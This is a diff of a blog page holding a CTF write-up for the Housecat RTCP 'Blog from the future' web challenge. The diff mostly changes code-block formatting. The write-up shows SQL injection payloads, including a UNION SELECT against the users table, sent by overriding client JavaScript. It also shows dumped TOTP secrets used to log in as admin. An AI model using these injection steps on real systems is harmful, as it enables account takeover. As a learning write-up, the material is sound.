@@ -1219,7 +1219,7 @@
 <meta name="keywords" content="web-ctf,housecat-rtcp-ctf">
 
 <meta name="created" content="2020-04-26T19:59:05&#43;0530">
-<meta name="modified" content="2020-04-27T00:37:25&#43;0530">
+<meta name="modified" content="2020-04-27T01:45:51&#43;0530">
 <meta property="article:published_time" content="2020-04-26T19:59:05&#43;0530">
 
 <meta name="author" content="Soham Sen">
@@ -1255,7 +1255,7 @@
     "@type": "WebPage",
     "headline": "Overriding JS to Perform SQL Injection (Housecat RTCP CTF Writeup: Blog from the future)",
     "datePublished": "2020-04-26T19:59:05+05:30",
-    "dateModified": "2020-04-27T00:37:25+05:30",
+    "dateModified": "2020-04-27T01:45:51+05:30",
     "url" : "https://blog.sohamsen.me/posts/overriding-js-sql-injection/",
     "description": "The TL;DR of this challenge was SQL injection and overriding javascript (to skip the encrypt/decrypt functions). Challenge Challenge Name: Blog from the future Challenge …",
     "keywords": ["web-ctf","housecat-rtcp-ctf"],
@@ -1618,52 +1618,120 @@ Disallow: /admin
 <p>You have to enable overriding support first in Google Chrome (no idea about Firefox, I don&rsquo;t use it), and <a href="https://developers.google.com/web/updates/2018/01/devtools#overrides">here is the official guide</a>.</p>
 <p>Then, you need to right click on the tab (<code>main.js</code> in this case) and you&rsquo;ll see <code>Save for overrides</code>. Press that, and you&rsquo;re ready!</p>
 <p>While overriding, <code>console.log()</code> is your friend. Use it everywhere and see what&rsquo;s happening. I saw a function that decrypted the received data and I added my <code>console.log()</code> there:</p>
-<pre><code>const e = JSON.parse(i.utils.utf8.fromBytes(i.padding.pkcs7.strip(u.decrypt(t))));
-console.log(e);
-</code></pre><p><img src="/images/console-output-hprtcpctf.png" alt="Console Output" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">utf8</span><span class="p">.</span><span class="nx">fromBytes</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">padding</span><span class="p">.</span><span class="nx">pkcs7</span><span class="p">.</span><span class="nx">strip</span><span class="p">(</span><span class="nx">u</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">t</span><span class="p">))));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/console-output-hprtcpctf.png" alt="Console Output" /></p>
 <p>Cool! Now it printed everything! Now, I had to modify the sent requests. Just below the above line, there was:</p>
-<pre><code>if (&quot;success&quot; === e) {
-    const t = parseInt(window.location.hash.substr(1));
-    if (!isNaN(t))
-        return r.send(o.encode([&quot;getPost&quot;, t]));
-    r.send(o.encode(&quot;listPosts&quot;))
-    }
-}
-</code></pre><p>And I found just what I wanted: a method to send data. In this case, it was getting the post ID from the URL, and sending that to get the post. Time for SQL Injection!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">if</span> <span class="p">(</span><span class="s2">&#34;success&#34;</span> <span class="o">===</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kr">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isNaN</span><span class="p">(</span><span class="nx">t</span><span class="p">))</span>
+        <span class="k">return</span> <span class="nx">r</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">encode</span><span class="p">([</span><span class="s2">&#34;getPost&#34;</span><span class="p">,</span> <span class="nx">t</span><span class="p">]));</span>
+    <span class="nx">r</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="s2">&#34;listPosts&#34;</span><span class="p">))</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And I found just what I wanted: a method to send data. In this case, it was getting the post ID from the URL, and sending that to get the post. Time for SQL Injection!</p>
 <h3 id="sql-injection">SQL Injection</h3>
 <p>To ensure I could do a  SQL Injection attack, I made it:</p>
-<pre><code>r.send(o.encode([&quot;getPost&quot;, &quot;1 OR 5=5;--&quot;]));
-</code></pre><p>And yes, it worked! I got all the posts on the site. Output of <code>console.log</code>:</p>
-<pre><code>(3) [&quot;post&quot;, &quot;1 OR 2=2;--&quot;, Array(2)]
-0: &quot;post&quot;
-1: &quot;1 OR 2=2;--&quot;
-2: Array(2)
-    0: {id: 1, title: &quot;Welcome to the future!&quot;, author: 1, text: &quot;I finally upgraded my blog to use the tech of the …to be truly able to call my blog &quot;futuristic&quot;. :/&quot;, postDate: 1580857200000, …}
-    1: {id: 2, title: &quot;A review of American sockets&quot;, author: 1, text: &quot;They're pretty cool, in my opinion.&quot;, postDate: 1580947200000, …}
-    __proto__: Array(0)
-length: 3
-__proto__: Array(0)
-</code></pre><p>Explanation: I assumed the SQL statement was something like <code>SELECT * FROM posts WHERE id=&lt;ID HERE&gt;</code>.<br />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">r</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">encode</span><span class="p">([</span><span class="s2">&#34;getPost&#34;</span><span class="p">,</span> <span class="s2">&#34;1 OR 5=5;--&#34;</span><span class="p">]));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And yes, it worked! I got all the posts on the site. Output of <code>console.log</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">[</span><span class="s2">&#34;post&#34;</span><span class="p">,</span> <span class="s2">&#34;1 OR 2=2;--&#34;</span><span class="p">,</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">2</span><span class="p">)]</span>
+<span class="mi">0</span><span class="o">:</span> <span class="s2">&#34;post&#34;</span>
+<span class="mi">1</span><span class="o">:</span> <span class="s2">&#34;1 OR 2=2;--&#34;</span>
+<span class="mi">2</span><span class="o">:</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="mi">0</span><span class="o">:</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">title</span><span class="o">:</span> <span class="s2">&#34;Welcome to the future!&#34;</span><span class="p">,</span> <span class="nx">author</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">text</span><span class="o">:</span> <span class="s2">&#34;I finally upgraded my blog to use the tech of the …to be truly able to call my blog &#34;</span><span class="nx">futuristic</span><span class="s2">&#34;. :/&#34;</span><span class="p">,</span> <span class="nx">postDate</span><span class="o">:</span> <span class="mi">1580857200000</span><span class="p">,</span> <span class="err">…</span><span class="p">}</span>
+    <span class="mi">1</span><span class="o">:</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">title</span><span class="o">:</span> <span class="s2">&#34;A review of American sockets&#34;</span><span class="p">,</span> <span class="nx">author</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">text</span><span class="o">:</span> <span class="s2">&#34;They&#39;re pretty cool, in my opinion.&#34;</span><span class="p">,</span> <span class="nx">postDate</span><span class="o">:</span> <span class="mi">1580947200000</span><span class="p">,</span> <span class="err">…</span><span class="p">}</span>
+    <span class="nx">__proto__</span><span class="o">:</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="nx">length</span><span class="o">:</span> <span class="mi">3</span>
+<span class="nx">__proto__</span><span class="o">:</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Explanation: I assumed the SQL statement was something like <code>SELECT * FROM posts WHERE id=&lt;ID HERE&gt;</code>.<br />
 So, my input made it: <code>SELECT * FROM posts WHERE id=1 OR 5=5;--</code>. Select everything from table posts where ID is 1 or 5=5 (which evaluates to True), aka fetch all posts. <code>;--</code> skips whatever is at the end, and terminates the query.</p>
 <p>After that, I used <code>UNION</code> to join another <code>SELECT</code> query to get user information. In <code>UNION</code>, you have to make sure the number of columns match and hence the <code>1,1</code> thing:</p>
-<pre><code>r.send(o.encode([&quot;getPost&quot;, &quot;1 OR 2=2 UNION SELECT *,1,1,0 from users;--&quot;]));
-</code></pre><p>I didn&rsquo;t find <code>users</code> table or <code>*,1,1,0</code> on first attempt. It took like 20-30 attempts to get it right.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">r</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">encode</span><span class="p">([</span><span class="s2">&#34;getPost&#34;</span><span class="p">,</span> <span class="s2">&#34;1 OR 2=2 UNION SELECT *,1,1,0 from users;--&#34;</span><span class="p">]));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>I didn&rsquo;t find <code>users</code> table or <code>*,1,1,0</code> on first attempt. It took like 20-30 attempts to get it right.</p>
 <p>First I did <code>UNION SELECT 1,1,1,1,1,1</code> but that didn&rsquo;t work cause the last variable <code>hidden</code> was <code>1</code>, and it didn&rsquo;t return that. <code>UNION SELECT 1,1,1,1,1,0</code> returned what was expected.<br />
 Then I tried to get table names from <code>information_schema.tables</code> but that wasn&rsquo;t working. I tried to use some &ldquo;common&rdquo; table names and <code>users</code> worked. Then I did <code>UNION SELECT *,0 from users;--</code>, and kept adding <code>,1</code> till it worked. (Remember, <code>UNION</code> means same number of columns)</p>
 <p>Here was the output:</p>
-<pre><code>(3) [&quot;post&quot;, &quot;1 OR 2=2 UNION SELECT *,1,1,0 from users;--&quot;, Array(4)]
-0: &quot;post&quot;
-1: &quot;1 OR 2=2 UNION SELECT *,1,1,0 from users;--&quot;
-2: Array(4)
-    0: {id: 1, title: &quot;Welcome to the future!&quot;, author: 1, text: &quot;I finally upgraded my blog to use the tech of the …to be truly able to call my blog &quot;futuristic&quot;. :/&quot;, postDate: 1580857200000, …}
-    1: {id: 1, title: &quot;alice&quot;, author: &quot;J5YD4O2BIZYEMVJYIY3F24S3GQ2VC3ZTKJQVW5JFJUYHKODXORQQ&quot;, text: 1, postDate: 1, …}
-    2: {id: 2, title: &quot;A review of American sockets&quot;, author: 1, text: &quot;They're pretty cool, in my opinion.&quot;, postDate: 1580947200000, …}
-    3: {id: 2, title: &quot;bob&quot;, author: &quot;IE3V2RR4HRLUEOBDLVCWCQTYF5LT6RTCONNDMULGGJGS4STUMYWA&quot;, text: 1, postDate: 1, …}
-    length: 4
-    __proto__: Array(0)
-length: 3
-__proto__: Array(0)
-</code></pre><p>I took the TOTP secret key for <code>bob</code> and plugged it into a <a href="https://totp.danhersam.com/">TOTP Generator</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">[</span><span class="s2">&#34;post&#34;</span><span class="p">,</span> <span class="s2">&#34;1 OR 2=2 UNION SELECT *,1,1,0 from users;--&#34;</span><span class="p">,</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
+<span class="mi">0</span><span class="o">:</span> <span class="s2">&#34;post&#34;</span>
+<span class="mi">1</span><span class="o">:</span> <span class="s2">&#34;1 OR 2=2 UNION SELECT *,1,1,0 from users;--&#34;</span>
+<span class="mi">2</span><span class="o">:</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="mi">0</span><span class="o">:</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">title</span><span class="o">:</span> <span class="s2">&#34;Welcome to the future!&#34;</span><span class="p">,</span> <span class="nx">author</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">text</span><span class="o">:</span> <span class="s2">&#34;I finally upgraded my blog to use the tech of the …to be truly able to call my blog &#34;</span><span class="nx">futuristic</span><span class="s2">&#34;. :/&#34;</span><span class="p">,</span> <span class="nx">postDate</span><span class="o">:</span> <span class="mi">1580857200000</span><span class="p">,</span> <span class="err">…</span><span class="p">}</span>
+    <span class="mi">1</span><span class="o">:</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">title</span><span class="o">:</span> <span class="s2">&#34;alice&#34;</span><span class="p">,</span> <span class="nx">author</span><span class="o">:</span> <span class="s2">&#34;J5YD4O2BIZYEMVJYIY3F24S3GQ2VC3ZTKJQVW5JFJUYHKODXORQQ&#34;</span><span class="p">,</span> <span class="nx">text</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">postDate</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="err">…</span><span class="p">}</span>
+    <span class="mi">2</span><span class="o">:</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">title</span><span class="o">:</span> <span class="s2">&#34;A review of American sockets&#34;</span><span class="p">,</span> <span class="nx">author</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">text</span><span class="o">:</span> <span class="s2">&#34;They&#39;re pretty cool, in my opinion.&#34;</span><span class="p">,</span> <span class="nx">postDate</span><span class="o">:</span> <span class="mi">1580947200000</span><span class="p">,</span> <span class="err">…</span><span class="p">}</span>
+    <span class="mi">3</span><span class="o">:</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">title</span><span class="o">:</span> <span class="s2">&#34;bob&#34;</span><span class="p">,</span> <span class="nx">author</span><span class="o">:</span> <span class="s2">&#34;IE3V2RR4HRLUEOBDLVCWCQTYF5LT6RTCONNDMULGGJGS4STUMYWA&#34;</span><span class="p">,</span> <span class="nx">text</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">postDate</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="err">…</span><span class="p">}</span>
+    <span class="nx">length</span><span class="o">:</span> <span class="mi">4</span>
+    <span class="nx">__proto__</span><span class="o">:</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="nx">length</span><span class="o">:</span> <span class="mi">3</span>
+<span class="nx">__proto__</span><span class="o">:</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>I took the TOTP secret key for <code>bob</code> and plugged it into a <a href="https://totp.danhersam.com/">TOTP Generator</a>.</p>
 <p>On the admin page, I Inspect-Elemented, and uncommented the TOTP input field and deleted password field. After entering the username (<code>bob</code>) and the generated TOTP, I was able to log in and get the flag.</p>
 <p>Flag is: <code>rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}</code>. GGWP.</p>
 <h2 id="conclusion">Conclusion</h2>
